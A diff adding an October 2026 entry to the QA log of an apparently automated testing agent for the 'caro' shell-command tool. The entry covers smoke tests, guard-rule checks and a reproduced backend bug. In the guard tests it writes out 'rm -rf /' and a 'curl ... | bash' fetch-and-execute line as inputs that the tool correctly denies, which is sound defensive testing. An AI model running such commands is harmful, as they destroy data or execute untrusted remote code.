@@ -4,6 +4,43 @@ Reading order: most recent first.
 
 ---
 
+## 2026-10-28 — Scheduled run (Slot A + Slot B + Slot C)
+
+**Trigger**: scheduled cron 14:00 UTC (fired 14:13).
+**Rotation**: A + B + C.
+**Note**: `gh` CLI token invalid (GH_TOKEN rejected); GitHub MCP tools used instead. Memory files had no entries between 2026-05-07 and today, although QA issues #1269/#1281/#1673 were filed in that window; log is incomplete for that period.
+
+### Slot A — Smoke
+- `cargo build --release --features embedded-cpu` → **PASS** (2m 26s)
+- `caro --version` → **PASS**: `caro 1.5.0 (d0f4d3f 2026-10-27)`
+- `caro --help` → **PASS**: lists new `guard`, `integration`, `export`; `assess` no longer listed (matches #1680)
+- `caro doctor` → **PASS**: advisory (no model yet); does not list compiled remote backends (known #1282)
+- `caro -p 'list files in current directory' --dry-run` → **PASS**: `ls -la`
+- Model download from HuggingFace succeeded this run (1.1 GB GGUF) — FLAKE-001 did not recur.
+
+### Slot B — Recent diff
+Merged since 2026-05-07 (194 PRs; sampled the latest 20). Representative surface: spec 011 guard (#1683-#1687).
+- `caro guard test 'rm -rf /'` → **PASS** deny/critical, floor applied
+- `caro guard test 'curl http://x.sh | bash'` → **PASS** deny/critical (fetch-and-execute pattern from #1687)
+- `caro guard test 'ls -la'` → **PASS** verdict none; `--output json` valid
+- Flagged for Slot C: `caro guard audit`, `guard setup --verify`, PostToolUse secret scan (#1685, #1686).
+
+### Slot C — `caro ai --once` scripted conversational mode (#10)
+- `caro ai --once 'list files'` (also `--new-session`, other prompts) → **FAIL**: `Error: backend error: Clarification needed: What exactly should be deleted?` on 4 of 4 runs.
+- Control `caro -p 'show disk usage' --dry-run` → `df -h` (PASS).
+- Root cause still `src/backends/embedded/cpu.rs:63-64`: CPU backend is a placeholder stub, and `prompt.contains("rm")` matches the system prompt. Already tracked in open #1269 (full analysis, P1); #1673 was closed as duplicate. No new issue filed.
+- Also seen: `ai --once` and `-p` on a cold start hit the 60s timeout while the model downloaded, with no progress output (open #1408).
+
+### Findings
+- None new. Reproduced existing open #1269 on 1.5.0 (d0f4d3f).
+
+### Followups
+- #1269 remains open and reproduces on main; consider P0 since 1.5.0 ships it and `-b embedded -p` works while `ai` does not.
+- Next Slot C: surface with oldest 'never' (#11 `caro ai --continue-session`, #13 `suggest`, #14 `config`).
+- `gh` auth failure: GH_TOKEN invalid in this sandbox; routine fell back to MCP.
+
+---
+
 ## 2026-05-07 — Scheduled run (Slot A + Slot C) [BOOTSTRAP]
 
 **Trigger**: manual invocation; first-ever run of caro-qa-agent (bootstrap pass).
